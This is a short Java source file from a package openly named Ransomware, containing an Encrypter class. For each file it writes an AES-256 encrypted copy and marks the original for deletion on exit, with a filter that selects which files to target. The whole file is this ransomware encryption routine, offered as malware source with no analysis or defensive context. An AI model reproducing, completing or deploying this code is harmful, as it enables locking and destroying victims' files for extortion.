package Ransomware.Encrypter;

import Ransomware.Crypter;
import Ransomware.AES_256;
import java.io.File;

public class Encrypter extends Crypter {

    public Encrypter(String ext,String key){
        super(key,ext);
    }
    public void processFile(File in){
        if (!in.isDirectory()) {
            File out = new File(generatorFilePath.getEncryptedFilePath(in));
            AES_256.encrypt(in,out,getKey());
            in.deleteOnExit();
        }
    }
    public boolean isCryptableFile(File file){
        return fileFilter.isAEncryptableFile(file);
    }
}
